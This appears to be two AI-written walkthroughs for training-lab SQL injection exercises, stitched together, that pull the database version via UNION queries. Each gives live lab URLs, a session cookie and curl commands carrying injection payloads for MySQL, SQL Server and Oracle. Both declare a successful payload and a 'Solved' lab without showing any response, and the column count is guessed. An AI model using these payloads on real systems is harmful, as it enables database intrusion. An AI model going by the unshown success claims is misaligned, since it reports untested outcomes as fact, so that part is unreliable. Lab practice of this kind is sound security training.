The goal is to display the database version (e.g., `MySQL 8.0.27` or `Microsoft SQL Server 2019`) in the application's response.\n\n---\n\n### **Step 2 \u2013 Access and Prepare**\n1. **Access the Lab**:  \n   - Lab URL: `https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/`\n   - Cookies are provided for authentication.\n\n2. **Verify Access**:  \n   - Send a basic request to confirm the lab is accessible.  \n   - Example `curl` command (with cookies):\n     ```bash\n     curl -s -H \"Cookie: SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZLBu0CI1n6029jB1XHkjwaXw7M9uIh6idqWWEMqVI9FhqlZMEOj%2FjELzn%2Bk1pfx6C2cuvvufxQ%2FdkDvoca%2FmCSxkf6BKLaS41xOfx4Bxyu%2Fz2ZenJ4lOm1i49uHY54n%2FLaHA0HI2FQQFZILls8nG1at; Authenticated_UserVerificationId=F41C10A373F05136EE61C7FAC1DCBB46\" \"https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/\"\n     ```\n   - **Expected**: A valid HTML response (status `200`).\n\n---\n\n### **Step 3 \u2013 Identify Vulnerable Parameter**\n- **Vulnerable Parameter**: The `category` parameter in the `/filter` endpoint (e.g., `/filter?category=Gifts`).\n- **Reasoning**:  \n  - The lab description mentions a **product category filter** vulnerable to SQL injection.\n  - The `category` parameter is likely used in a SQL query like:\n    ```sql\n    SELECT * FROM products WHERE category = 'Gifts' AND released = 1\n    ```\n\n---\n\n### **Step 4 \u2013 Payloads to Test**\nSince the lab specifies **MySQL and Microsoft SQL Server**, we use their respective syntax for the **UNION attack**:\n1. **Determine the number of columns** (required for `UNION`):\n   ```sql\n   ' ORDER BY 1--\n   ' ORDER BY 2--\n   ' ORDER BY 3--  # Continue until an error occurs\n   ```\n2. **Confirm string-based columns** (for displaying the version):\n   ```sql\n   ' UNION SELECT 'a', 'b', NULL--\n   ```\n3. **Retrieve the database version**:\n   - **MySQL**:\n     ```sql\n     ' UNION SELECT NULL, @@version, NULL--\n     ```\n   - **Microsoft SQL Server**:\n     ```sql\n     ' UNION SELECT NULL, @@version, NULL--\n     ```\n\n---\n\n### **Step 5 \u2013 Execute and Observe**\n1. **Find the number of columns**:\n   ```bash\n   curl -s -H \"Cookie: SessionId=...\" \"https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/filter?category=' ORDER BY 3--\"\n   ```\n   - If `ORDER BY 3` works but `ORDER BY 4` fails, there are **3 columns**.\n\n2. **Confirm string columns**:\n   ```bash\n   curl -s -H \"Cookie: SessionId=...\" \"https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/filter?category=' UNION SELECT 'a', 'b', NULL--\"\n   ```\n   - Check if `'a'` or `'b'` appears in the response.\n\n3. **Retrieve the version**:\n   - For **MySQL**:\n     ```bash\n     curl -s -H \"Cookie: SessionId=...\" \"https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/filter?category=' UNION SELECT NULL, @@version, NULL--\"\n     ```\n   - For **Microsoft SQL Server**:\n     ```bash\n     curl -s -H \"Cookie: SessionId=...\" \"https://0ab800bf038875f780873aca00fc0083.web-security-academy.net/filter?category=' UNION SELECT NULL, @@version, NULL--\"\n     ```\n   - **Expected Output**: The database version string (e.g., `MySQL 8.0.27` or `Microsoft SQL Server 2019`).\n\n---\n\n### **Step 6 \u2013 Result**\n- **Successful Payload**:  \n  ```sql\n  ' UNION SELECT NULL, @@version, NULL--\n  ```\n- **Confirmation**:  \n  The response includes the database version string.  \n  The lab updates to **\"Solved\"**.\n\n---\n\n### **Step 7 \u2013 Final Summary**\n- **Vulnerable Parameter**: `category` in `/filter`.\n- **Successful Payload**:  \n  ```sql\n  ' UNION SELECT NULL, @@version, NULL--\n  ```\n- **How It Worked**:  \n  - The payload injects a `UNION` query to fetch the database version using `@@version`.  \n  - The application displays the version string in the response, solving the lab.\n\n---\n\n### **Key Takeaways**\n1. **MySQL and Microsoft SQL Server** use `@@version` for retrieving the version.\n2. **UNION attacks require matching column counts**.\n3. **Always test for string columns** before retrieving data.\n\nThis method reliably exploits the SQL injection to leak the database version. Let me know if you'd like to test additional payloads or explore further!"}

The goal is to display the database version (e.g., `Oracle Database 19c`) in the application's response.\n\n---\n\n### **Step 2 \u2013 Access and Prepare**\n1. **Access the Lab**:  \n   - Lab URL: `https://0a85002a038986b581d01c1200440027.web-security-academy.net/`\n   - Cookies are provided for authentication.\n\n2. **Verify Access**:  \n   - Send a basic request to confirm the lab is accessible.  \n   - Example `curl` command (with cookies):\n     ```bash\n     curl -s -H \"Cookie: SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZLBu0CI1n6029jB1XHkjwaXw7M9uIh6idqWWEMqVI9FhqlZMEOj%2FjELzn%2Bk1pfx6C2cuvvufxQ%2FdkDvoca%2FmCSxkf6BKLaS41xOfx4Bxyu%2Fz2ZenJ4lOm1i49uHY54n%2FLaHA0HI2FQQFZILls8nG1at; Authenticated_UserVerificationId=F41C10A373F05136EE61C7FAC1DCBB46\" \"https://0a85002a038986b581d01c1200440027.web-security-academy.net/\"\n     ```\n   - **Expected**: A valid HTML response (status `200`).\n\n---\n\n### **Step 3 \u2013 Identify Vulnerable Parameter**\n- **Vulnerable Parameter**: The `category` parameter in the `/filter` endpoint (e.g., `/filter?category=Gifts`).\n- **Reasoning**:  \n  - The lab description mentions a **product category filter** vulnerable to SQL injection.\n  - The `category` parameter is likely used in a SQL query like:\n    ```sql\n    SELECT * FROM products WHERE category = 'Gifts' AND released = 1\n    ```\n\n---\n\n### **Step 4 \u2013 Payloads to Test**\nSince the lab specifies **Oracle**, we use Oracle-specific syntax for the **UNION attack**:\n1. **Determine the number of columns** (required for `UNION`):\n   ```sql\n   ' ORDER BY 1--\n   ' ORDER BY 2--\n   ' ORDER BY 3--  # Continue until an error occurs\n   ```\n2. **Confirm string-based columns** (for displaying the version):\n   ```sql\n   ' UNION SELECT 'a', 'b', NULL FROM dual--\n   ```\n3. **Retrieve the database version** (Oracle uses `v$version` or `banner`):\n   ```sql\n   ' UNION SELECT NULL, banner, NULL FROM v$version--\n   ```\n   or:\n   ```sql\n   ' UNION SELECT NULL, version, NULL FROM v$instance--\n   ```\n\n---\n\n### **Step 5 \u2013 Execute and Observe**\n1. **Find the number of columns**:\n   ```bash\n   curl -s -H \"Cookie: SessionId=...\" \"https://0a85002a038986b581d01c1200440027.web-security-academy.net/filter?category=' ORDER BY 3--\"\n   ```\n   - If `ORDER BY 3` works but `ORDER BY 4` fails, there are **3 columns**.\n\n2. **Confirm string columns**:\n   ```bash\n   curl -s -H \"Cookie: SessionId=...\" \"https://0a85002a038986b581d01c1200440027.web-security-academy.net/filter?category=' UNION SELECT 'a', 'b', NULL FROM dual--\"\n   ```\n   - Check if `'a'` or `'b'` appears in the response.\n\n3. **Retrieve the version**:\n   ```bash\n   curl -s -H \"Cookie: SessionId=...\" \"https://0a85002a038986b581d01c1200440027.web-security-academy.net/filter?category=' UNION SELECT NULL, banner, NULL FROM v$version--\"\n   ```\n   - **Expected Output**: The Oracle version string (e.g., `Oracle Database 19c`).\n\n---\n\n### **Step 6 \u2013 Result**\n- **Successful Payload**:  \n  ```sql\n  ' UNION SELECT NULL, banner, NULL FROM v$version--\n  ```\n- **Confirmation**:  \n  The response includes the Oracle version string (e.g., `Oracle Database 19c Enterprise Edition Release 19.0.0.0.0`).  \n  The lab updates to **\"Solved\"**.\n\n---\n\n### **Step 7 \u2013 Final Summary**\n- **Vulnerable Parameter**: `category` in `/filter`.\n- **Successful Payload**:  \n  ```sql\n  ' UNION SELECT NULL, banner, NULL FROM v$version--\n  ```\n- **How It Worked**:  \n  - The payload injects a `UNION` query to fetch the database version from `v$version`.  \n  - The application displays the version string in the response, solving the lab.\n\n---\n\n### **Key Takeaways**\n1. **Oracle-specific syntax** (`v$version`, `dual`) is critical.\n2. **UNION attacks require matching column counts**.\n3. **Always test for string columns** before retrieving data.\n\nThis method reliably exploits the SQL injection to leak the database version.
